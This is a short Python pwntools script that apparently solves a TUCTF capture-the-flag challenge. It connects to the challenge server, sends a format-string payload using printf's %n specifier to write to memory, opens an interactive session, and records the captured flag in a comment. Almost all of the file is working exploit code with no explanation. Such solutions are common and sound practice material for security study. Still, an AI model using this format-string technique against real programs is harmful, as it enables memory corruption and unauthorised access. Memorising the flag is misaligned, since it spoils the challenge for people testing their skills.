#coding: utf-8
from pwn import *

IP = "chal.tuctf.com"
PORT = 30501
r = remote(IP, PORT)

p = "%7$n%n\x00"

r.send(p)
r.interactive()

# TUCTF{wh47'5_4_pr1n7f_l1k3_y0u_d01n6_4_b1n4ry_l1k3_7h15?}
